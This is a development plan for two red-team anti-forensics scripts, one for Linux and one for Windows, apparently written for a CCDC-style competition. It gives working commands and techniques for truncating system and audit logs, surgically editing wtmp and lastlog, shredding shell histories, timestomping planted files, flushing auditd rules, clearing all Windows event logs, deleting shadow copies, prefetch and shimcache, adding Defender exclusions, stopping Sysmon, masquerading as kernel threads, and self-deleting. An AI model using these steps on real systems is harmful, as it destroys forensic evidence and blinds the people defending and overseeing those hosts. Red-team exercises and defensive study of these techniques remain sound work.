# Anti-Forensics & Stealth Scripts — Development Plan

**Destination:** `Phase_2_Tools/Scripts_Planning/AntiForensics_Plan.md`

---

# Design Philosophy

**Wipe evidence. Do not break the host.**

- Clean up artifacts of our presence; leave the system functional and scored services running
- Prefer one-shot cleanup over persistent modifications — persistent changes leave their own detectable artifacts
- Never permanently disable services; stop them briefly to rotate logs, then restart them
- No destructive routing or firewall changes — too noisy, too easy to detect
- No `chattr +i` — `lsattr -R /` finds every immutable file instantly, turning our persistence into a treasure map
- No writing new config files that persist (`/etc/rsyslog.d/00-override.conf`, etc.) — those get picked up by blue team config audits
- Surgical over nuclear: remove only red team artifacts, leave everything else untouched and normal

---

# Distro Support (All Linux Anti-Forensics Scripts)

**All Linux scripts must support Ubuntu, Fedora, and Oracle Linux 9.**

- Distro detection via `/etc/os-release` (`ID` field): `ubuntu`/`debian` → apt paths; `fedora` → dnf; `ol`/`rhel`/`centos` → dnf + RHEL paths
- Log paths differ by distro: `/var/log/auth.log` (Ubuntu) vs `/var/log/secure` (RHEL/Fedora)
- Service names: `rsyslog` (common), `syslog-ng` (some), `systemd-journald` (all)
- auditd: `/var/log/audit/audit.log` on RHEL/Fedora/Oracle; may be absent on Ubuntu

---

# Context

Phase 2 Anti-Forensics add-on: two scripts (Linux + Windows) that give the red team operator a single-command option to erase evidence of compromise after deploying Phase 2 payloads. Run as the last step before leaving a host.

Scripts follow the naming convention and header style established in Phase 1 & 2.

---

## MITRE ATT&CK Technique Coverage

| Technique | Sub | Name | Linux | Windows |
|---|---|---|---|---|
| T1070 | .001 | Clear Windows Event Logs | — | ✓ |
| T1070 | .002 | Clear Linux/Mac System Logs | ✓ | — |
| T1070 | .003 | Clear Command History | ✓ | ✓ |
| T1070 | .004 | File Deletion (secure wipe) | ✓ | ✓ |
| T1070 | .006 | Timestomp | ✓ | ✓ |
| T1562 | .001 | Disable or Modify Security Tools (scoped, non-destructive) | ✓ | ✓ |
| T1036 | .005 | Masquerade as Legitimate Name/Location | ✓ | ✓ |
| T1027 | .005 | Indicator Removal from Tools (self-wipe) | ✓ | ✓ |
| T1480 | — | Execution Guardrails (passphrase gate) | ✓ | ✓ |

---

## Script 1 — `CCDC_Linux_AntiForensics_VanishingAct.sh`

**MITRE:** T1070.002, T1070.003, T1070.004, T1070.006, T1562.001, T1036.005, T1027.005, T1480
**OS:** Linux (Ubuntu / Fedora / Oracle Linux 9)
**Privileges:** Root required
**Location:** `Phase_2_Tools/General_Scripts/SetupScripts/linux/CCDC_Linux_AntiForensics_VanishingAct.sh`

### What it does

#### Phase A — Execution Guardrails (T1480)
- Requires passphrase as first argument (`./script.sh <passphrase>`)
- Wrong/missing passphrase: prints a fake `bash: ./VanishingAct.sh: /bin/bash: bad interpreter: No such file or directory` and exits 1 — looks like a broken script, not a gate
- If correct: continues silently with no output unless `--verbose` flag is passed

#### Phase B — Masquerade (T1036.005)
- Execution is wrapped: script exec's itself as `[kworker/u4:1]` so it appears as a kernel thread in `ps aux` and `top` output during its run
- Uses `exec -a "[kworker/u4:1]" bash "$0" "$@"` pattern on first run before doing any work

#### Phase C — Log Truncation (T1070.002)
- Truncates (not deletes) log files so the file exists and the service keeps writing without error
- `> /var/log/auth.log` / `> /var/log/secure` — SSH logins, sudo, su
- `> /var/log/syslog` / `> /var/log/messages` — general system log
- `> /var/log/kern.log` — kernel messages (LKM loading, etc.)
- `> /var/log/audit/audit.log` and rotated copies `.1` `.2` `.3` (if present)
- `> /var/log/apt/history.log`, `> /var/log/dnf.log`, `> /var/log/yum.log` — package install history
- `> /var/log/dpkg.log` — dpkg records
- `> /var/log/cron`, `> /var/log/cron.log` — cron execution
- `> /var/log/daemon.log`, `> /var/log/mail.log` — extras
- `> /var/log/faillog` — failed login log (binary — safe to zero via truncate)
- Journald: `journalctl --rotate --vacuum-time=1s` flushes and vacuums all journal entries; journald restarts cleanly on its own
- All truncations done with `truncate -s 0` or `> file` — the file descriptor stays open for the logging daemon, which continues writing to the now-empty file without needing a restart (no service disruption)

#### Phase D — Surgical Wtmp/Utmp Scrub (T1070.002)
- **Do NOT zero the entire file** — a blank wtmp is suspicious (`last` shows nothing)
- Use a small inline Python3 script to parse `/var/log/wtmp` in binary (`struct` format, 384-byte `utmp` records) and rewrite the file with only the operator's entries (matched by username or source IP) removed
- Same for `/var/run/utmp` (active sessions) — remove the operator's entry by pty/username match
- `/var/log/lastlog`: binary file indexed by UID — zero out the operator's UID slot only using Python `struct` seek+write; leave all other users' entries intact
- Result: `last`, `who`, `w` show normal historical entries but operator's session is gone

#### Phase E — Shell & Tool History Wipe (T1070.003)
- For `/root` and every home dir under `/home/*`:
  - `shred -zu ~/.bash_history` then unlink (shred before delete so data is unrecoverable)
  - Unlink `.zsh_history`, `.sh_history`, `.fish/fish_history` (if present)
  - Unlink `.python_history`, `.mysql_history`, `.psql_history`, `.lesshst`, `.viminfo`
- In current shell: `unset HISTFILE; history -c`
- Skip missing files silently

#### Phase F — Timestomping (T1070.006)
- For each red team artifact still on disk (planted SSH keys, systemd units, cron entries, LKM file, initramfs hook, Chef cookbook dirs):
  - Find the nearest unrelated file in the same directory that predates the exercise
  - `touch -r <reference_file> <target_file>` to copy that file's mtime/atime onto the artifact
  - Also touch the parent directory's mtime to a pre-exercise time the same way
- This makes `ls -la` and `find -newer` checks return nothing suspicious

#### Phase G — Auditd Rule Flush (T1562.001, scoped)
- `auditctl -D` — flushes all active auditd rules so nothing new about red team activity gets recorded
- Does NOT stop or disable the auditd service — leaving it running looks normal; it just has no rules to match anything
- On RHEL/Oracle where auditd can't be stopped without special commands anyway, this is the correct approach

#### Phase H — Secure File Deletion of Red Team Staging Dirs (T1070.004)
- Red team staging dirs (e.g., `/tmp/rt_*`, `/dev/shm/*`, `/run/.rt/`): iterate files and `shred -zu` each one, then rmdir
- If `shred` is unavailable: `dd if=/dev/urandom of=<file> bs=$(stat -c%s <file>) count=1 conv=notrunc; rm <file>`
- Remove any tool binaries downloaded during the exercise (compiled C helpers, etc.)
- Remove `/tmp/.X*-lock` or similar leftover socket/lock files from red team tools

#### Phase I — Self-Destruction (T1027.005)
- After all phases complete: `shred -zu "$0"` — overwrites and deletes the script itself
- Clears in-session history one final time: `history -c`
- Does nothing else — no exit message, no banner; it just stops

---

## Script 2 — `CCDC_Windows_AntiForensics_MemoryHole.ps1`

**MITRE:** T1070.001, T1070.003, T1070.004, T1070.006, T1562.001, T1036.005, T1027.005, T1480
**OS:** Windows (Server 2016/2019/2022, Win10/11)
**Privileges:** Administrator required
**Location:** `Phase_2_Tools/General_Scripts/SetupScripts/windows/CCDC_Windows_AntiForensics_MemoryHole.ps1`

### What it does

#### Phase A — Execution Guardrails (T1480)
- Passphrase as first parameter; wrong/missing passphrase prints a fake "Exception calling 'GetMethod' with '1' argument(s): 'Ambiguous match found.'" and exits — looks like a broken reflection call, not a gate
- Correct passphrase: continues silently (no banner unless `-Verbose`)

#### Phase B — Masquerade (T1036.005)
- Set the PowerShell window title to `Windows Update Agent` via `$Host.UI.RawUI.WindowTitle`
- Spawn expensive phases as background jobs named `WMI Provider Host` via `-Name` parameter so they appear with benign names in process listings

#### Phase C — Windows Event Log Clearing (T1070.001)
- Enumerate all event log channels: `wevtutil el`
- Clear every channel with `wevtutil cl <logname>` — handles Security, System, Application, PowerShell/Operational, Sysmon/Operational, Windows Defender/Operational, TaskScheduler/Operational, TerminalServices-LocalSessionManager, etc.
- Use `wevtutil` only (not stopping the EventLog service — stopping it is destructive and risky)
- Errors on protected logs are silently swallowed; script continues
- Key targets: Security (logon events 4624/4625/4648), PowerShell/Operational (script block IDs), Sysmon (all process/network events)

#### Phase D — PowerShell & Shell History (T1070.003)
- PSReadLine history file for all user profiles: `$env:SystemDrive\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt` — delete each if present
- Current session: `Clear-History; Set-Variable -Name MaximumHistoryCount -Value 0`
- Recent items: `Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -Recurse -ErrorAction SilentlyContinue`

#### Phase E — Timestomping (T1070.006)
- For all red team dropped files, copy timestamps from a nearby legitimate system file in the same directory:
  ```powershell
  $ref = (Get-Item "C:\Windows\System32\ntdll.dll")
  [System.IO.File]::SetCreationTime($target, $ref.CreationTime)
  [System.IO.File]::SetLastWriteTime($target, $ref.LastWriteTime)
  [System.IO.File]::SetLastAccessTime($target, $ref.LastAccessTime)
  ```
- Targets: planted PS1 files, payload binaries, created scheduled task XML files, dropped DLLs, registry export backups
- Simple, reliable, no P/Invoke needed — `[System.IO.File]` static methods cover the use case cleanly

#### Phase F — Prefetch Deletion (T1070.004)
- `Remove-Item "$env:SystemRoot\Prefetch\*.pf" -Force -ErrorAction SilentlyContinue`
- Removes execution evidence for every binary that ran since last prefetch clear
- Does NOT disable prefetch going forward — disabling it is detectable and unnecessary

#### Phase G — Shimcache Wipe (T1070.004)
- Clear `AppCompatCache` registry value: `Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache" -Name "AppCompatCache" -ErrorAction SilentlyContinue`
- Takes effect on next reboot, but poisons forensic reconstruction now
- Low risk — registry value is just a cache; Windows rebuilds it; no service disruption

#### Phase H — Shadow Copy Deletion (T1070.004)
- `vssadmin delete shadows /all /quiet` — removes Volume Shadow Copies blue team could use to recover wiped files
- `wmic shadowcopy delete` as fallback
- Does NOT disable VSS service going forward — disabling VSS permanently is noisy and breaks legitimate Windows functions (backup, System Restore)

#### Phase I — Windows Defender Scoped Exclusion (T1562.001)
- Add red team staging paths to Defender exclusions so it stops scanning/alerting on them:
  `Add-MpPreference -ExclusionPath "C:\Windows\Temp\rt_staging"`
- Does NOT disable real-time monitoring globally — too noisy, too detectable, not needed
- If Sysmon is present: `Stop-Service -Name Sysmon -Force -ErrorAction SilentlyContinue` then clear Sysmon log via `wevtutil cl Microsoft-Windows-Sysmon/Operational`; do NOT delete the Sysmon binary or service entry (binary deletion triggers EDR alerts)

#### Phase J — MRU & Registry Cleanup (T1070.004)
- Remove MRU entries that log recently accessed files and run commands:
  - `HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs`
  - `HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU`
  - `HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths`
  - `HKCU:\Software\Microsoft\Internet Explorer\TypedURLs`
- Remove any red team persistence registry keys (Run, RunOnce, Services entries we planted)
- Done last so our persistence survives as long as possible, cleaned just before exit

#### Phase K — Secure File Deletion of Red Team Staging Dirs (T1070.004)
- For each red team staging file: overwrite with random bytes then delete:
  ```powershell
  $bytes = [byte[]]::new((Get-Item $f).Length)
  [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($bytes)
  [System.IO.File]::WriteAllBytes($f, $bytes)
  Remove-Item $f -Force
  ```
- Remove staging directories after files are cleared

#### Phase L — Self-Deletion (T1027.005)
- PowerShell cannot delete itself while running; use a one-liner VBScript launcher dropped to `$env:TEMP\c.vbs`:
  ```vbs
  Set fso = CreateObject("Scripting.FileSystemObject")
  WScript.Sleep 2000
  fso.DeleteFile WScript.Arguments(0)
  fso.DeleteFile WScript.ScriptFullName
  ```
- Script ends by calling: `Start-Process wscript.exe -ArgumentList "$env:TEMP\c.vbs", "$PSCommandPath" -WindowStyle Hidden`
- Then exits immediately — VBScript deletes both the PS1 and itself 2 seconds later

---

## Naming & Style Rules

Same as Phase 2:
- **Linux**: `#!/usr/bin/env bash` + `set -euo pipefail`; color helpers `info()` `warn()` `success()` `err()`; root check via `$EUID`; ASCII banner
- **Windows**: `#Requires -RunAsAdministrator` + `Set-StrictMode -Version Latest`; color helpers `Write-Info` `Write-Warn` `Write-Success` `Write-Err`; ASCII banner
- Attribution comment + plan reference path in every header
- Both scripts silent by default; operator can pass `--verbose` / `-Verbose` to see phase-by-phase output

---

## What Was Intentionally Left Out

| Removed | Reason |
|---|---|
| `chattr +i` on red team artifacts | `lsattr -R /` finds every immutable file instantly — turns our persistence into a treasure map |
| Routing `rsyslog` to `/dev/null` | Persists as `/etc/rsyslog.d/00-override.conf` — config audits catch it immediately |
| Blackholing SIEM IP via `ip route add blackhole` | Obvious routing anomaly; doesn't survive reboot; alerting in itself |
| `systemctl disable auditd` / `rsyslog` | Disabled services are immediately obvious; breaking logging is detectable |
| `ln -sf /dev/null /var/run/syslog` | Destructive; breaks syslog socket; other processes notice |
| Zeroing `/var/log/wtmp` entirely | `last` shows "no logins ever" — analysts know it was wiped |
| ETW `EtwEventWrite` in-memory patching | Risky; can cause process crashes; complex to do safely |
| Stopping EventLog service to delete `.evtx` files | Too risky; `wevtutil cl` covers it cleanly |
| `sc config VSS start= disabled` | Breaks Windows Backup, System Restore, legit features; noisy |
| `fsutil usn deletejournal` | Can cause NTFS corruption on some configs; `wevtutil` + prefetch covers investigation trails |
| Killing CrowdStrike/Carbon Black agents | Kernel-level protection; killing them triggers alerts and can BSOD the host |
| Disabling Windows Event Logging via `auditpol /clear` | Too aggressive; leaves a clear gap in audit policy that analysts notice |
| Amcache.hve stop-service-and-delete | Stopping Application Experience + deleting hive is risky and unusual |
| NTFS ADS artifact hiding | Shimcache/prefetch/MRU cleanup already covers forensic trails; ADS is detectable with `dir /r` |

---

## Operational Notes

- **Run order**: Run AFTER all Phase 2 setup scripts have deployed. This is the last thing before the operator leaves the host.
- **Idempotent**: Missing files and logs are silently skipped. Safe to run multiple times.
- **Scoring safety**: Neither script touches scored services. Evidence cleanup only.
- **Surgical wtmp**: Removing only operator entries (by username/IP) is far stealthier than zeroing the file — `last` still shows other legitimate logins, nothing looks wiped.
- **Timestomping target list**: Should be customized at the top of each script with a hardcoded list of the paths Phase 2 setup scripts commonly touch (e.g., `/etc/cron.d/`, `/etc/sudoers.d/`, `/etc/modules-load.d/`, etc.)

---

## File Destinations

```
Phase_2_Tools/General_Scripts/SetupScripts/
├── linux/
│   └── CCDC_Linux_AntiForensics_VanishingAct.sh
└── windows/
    └── CCDC_Windows_AntiForensics_MemoryHole.ps1

Phase_2_Tools/Scripts_Planning/
└── AntiForensics_Plan.md   <- this file
```

---

## Stub File Format

Header comment block in each stub includes:
- Script filename + plan reference path
- Full MITRE ATT&CK ID list
- OS and privilege requirements
- All phases listed with one-line descriptions
- Key warnings (e.g., "surgical wtmp edit — do not zero entire file", "do not disable VSS")

---

## Verification (After Stubs Created)

```bash
ls Phase_2_Tools/General_Scripts/SetupScripts/linux/CCDC_Linux_AntiForensics_VanishingAct.sh
ls Phase_2_Tools/General_Scripts/SetupScripts/windows/CCDC_Windows_AntiForensics_MemoryHole.ps1

# Syntax check Linux stub:
bash -n Phase_2_Tools/General_Scripts/SetupScripts/linux/CCDC_Linux_AntiForensics_VanishingAct.sh && echo "OK"
```
